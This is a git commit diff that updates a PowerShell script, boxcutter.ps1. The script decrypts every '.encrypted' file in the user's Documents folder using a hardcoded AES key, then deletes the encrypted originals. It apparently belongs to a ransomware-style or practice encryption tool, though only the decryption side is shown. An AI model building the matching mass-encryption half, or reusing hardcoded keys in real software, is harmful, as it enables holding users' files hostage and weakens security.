19c3563f87b6f46f6e0a14cec1ef85c85652976b
eternalhoodie <juliabartelli3@gmail.com>
2025-04-30 13:02:43 -0400

    Update boxcutter.ps1

--- boxcutter.ps1
+++ boxcutter.ps1
@@ -1,12 +1,28 @@
-function Decrypt-File($path){
-    $aes=New-Object System.Security.Cryptography.AesManaged
-    $aes.Key=[System.Text.Encoding]::UTF8.GetBytes('hormonereplacementtherapy'.PadRight(32))
-    $decryptor=$aes.CreateDecryptor()
-    $fsIn=New-Object System.IO.FileStream $path,'Open'
-    $fsOut=New-Object System.IO.FileStream ($path -replace '\.encrypted$'),'Create'
-    $cs=New-Object System.Security.Cryptography.CryptoStream $fsOut,$decryptor,'Write'
+function Decrypt-File($path) {
+    $key = 'hormonereplacementtherapy'
+    $aes = New-Object System.Security.Cryptography.AesManaged
+    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32))
+
+    $fsIn = New-Object System.IO.FileStream $path, 'Open'
+    
+    # Read IV from beginning of file
+    $iv = New-Object byte[] $aes.IV.Length
+    $fsIn.Read($iv, 0, $iv.Length) | Out-Null
+    $aes.IV = $iv
+
+    $decryptor = $aes.CreateDecryptor()
+    $outputPath = $path -replace '\.encrypted$'
+    
+    $fsOut = New-Object System.IO.FileStream $outputPath, 'Create'
+    $cs = New-Object System.Security.Cryptography.CryptoStream $fsOut, $decryptor, 'Write'
     $fsIn.CopyTo($cs)
+    
     $cs.Close()
     $fsIn.Close()
     Remove-Item $path
+}
+
+# Usage: Decrypt all .encrypted files
+Get-ChildItem -Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)) -Recurse -File -Filter *.encrypted | % {
+    Decrypt-File $_.FullName
 }
